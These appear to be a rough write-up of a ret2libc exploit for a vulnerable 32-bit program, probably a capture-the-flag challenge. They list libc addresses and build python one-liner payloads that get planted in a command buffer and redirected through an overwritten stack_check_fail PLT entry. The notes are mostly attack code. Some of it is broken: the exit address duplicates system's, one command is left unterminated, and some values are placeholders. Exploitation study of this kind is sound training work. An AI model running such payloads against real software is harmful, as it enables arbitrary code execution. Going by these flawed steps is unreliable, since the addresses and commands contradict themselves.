addr of "/bin/sh" : 0xf7f897ec
addr of system: 0xf7e6aed0
addr of exit: 0xf7e6aed0

Ret2libc code:

```
python -c 'print "\xf7\xe6\xae\xd0"[::-1] + "\xf7\xe6\xae\xd0"[::-1] + "\xf7\xf8\x97\xec"[::-1] + "\n" + "
```

We need to be able to put this code in a place where it can be executed later on.
Command[20] could allow us to store this ret2libc as the commands are quite short and no check is performed on these adresses

To do so we can first call for a garbage command to prefix our shellcode

```
python -c 'print "AAAAAA" + "\xf7\xe6\xae\xd0"[::-1] + "\xf7\xe6\xae\xd0"[::-1] + "\xf7\xf8\x97\xec"[::-1] + "\n"'
```

This should allow us to be able to then call "store" command and pass an index without touching to the ret2libc code contained in command[20]

The data we want to store using "store" needs to be put at an index that will be executed.
To do so we can override the address of the plt of a function -> stack_check_fail : 0x804a010

```
python -c 'print "AAAAAA" + "\xf7\xe6\xae\xd0"[::-1] + "\xf7\xe6\xae\xd0"[::-1] + "\xf7\xf8\x97\xec"[::-1] + "\n" + "store" + "\n" + <address of command buffer + 7> + "\n" + <index diff between start of data[100] and 0x804a010> '
```
